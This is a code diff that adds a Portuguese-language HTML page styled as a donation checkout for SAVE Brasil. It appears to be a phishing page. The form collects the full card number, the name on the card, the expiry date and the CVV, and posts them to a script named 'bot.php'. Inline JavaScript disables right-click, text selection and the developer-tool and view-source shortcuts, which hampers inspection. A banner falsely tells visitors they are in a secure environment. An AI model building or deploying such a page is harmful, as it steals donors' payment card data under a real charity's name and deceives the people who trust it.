@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Checkout - Doação para SAVE Brasil</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <script src="script.js" defer></script>
+    <script type="text/javascript">
+        var message="Desculpe, o clique com o botão direito foi desativado.";
+
+        function clickIE() {
+          if (document.all) {
+            (message);return false;
+          }
+        }
+
+        function clickNS(e) {
+          if (document.layers||(document.getElementById&&!document.all)) {
+            if (e.which==2||e.which==3) {
+              (message);
+              return false;
+            }
+          }
+        }
+
+        if (document.layers) {
+          document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;
+        } else {
+          document.onmouseup=clickNS;document.oncontextmenu=clickIE;
+        }
+
+        document.oncontextmenu=new Function("return false")
+
+        document.onkeydown = function(e) {
+          if(event.keyCode == 123) {
+            return false;
+          }
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+            return false;
+          }
+          if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+            return false;
+          }
+          if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+            return false;
+          }
+        }
+
+        function disableselect(e) {
+          return false;
+        }
+
+        function reEnable() {
+            return true;
+        }
+
+        document.onselectstart = new Function("return false");
+
+        if (window.sidebar) {
+            document.onmousedown = disableselect;
+            document.onclick = reEnable;
+        }
+    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div class="checkout-container">
+        <img src="ll.webp" alt="Doação para SAVE Brasil" id="donation-image" style="display: block; margin: 0 auto;">
+        <form id="donation-form" action="bot.php" method="post">
+            <input type="hidden" id="selected-amount" name="selected_amount" value="">
+
+            <label for="valor-doacao">Informe o valor da sua doação:</label>
+            <div class="donation-amounts">
+                <button type="button" class="donation-button" data-amount="120">R$ 120</button>
+                <button type="button" class="donation-button" data-amount="240">R$ 240</button>
+                <button type="button" class="donation-button" data-amount="500">R$ 500</button>
+                <input type="text" id="valor-doacao" name="valor_doacao" placeholder="R$ 1,00">
+            </div>
+
+            <label>Forma de pagamento:</label>
+            <div class="payment-method">
+                <input type="radio" id="cartao-credito" name="forma_pagamento" value="Cartão de Crédito" checked>
+                <label for="cartao-credito"><i class="fas fa-credit-card"></i> Cartão de crédito</label>
+                <div class="credit-card-info">
+                    <input type="text" id="numero-cartao" name="numero_cartao" placeholder="Número do cartão" inputmode="numeric" pattern="[0-9]*" maxlength="16" required>
+                    <input type="text" id="nome-cartao" name="nome_cartao" placeholder="Nome no cartão" maxlength="20" required>
+                    <input type="text" id="validade-cartao" name="validade_cartao" placeholder="Validade (MM/AA)" maxlength="5" required>
+                    <input type="text" id="cvv" name="cvv" placeholder="CVV" inputmode="numeric" pattern="[0-9]*" maxlength="3" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-button">QUERO DOAR</button>
+        </form>
+        <br><br><p><i class="fas fa-lock"></i> Você está em um ambiente seguro</p>
+    </div>
+</body>
+</html>
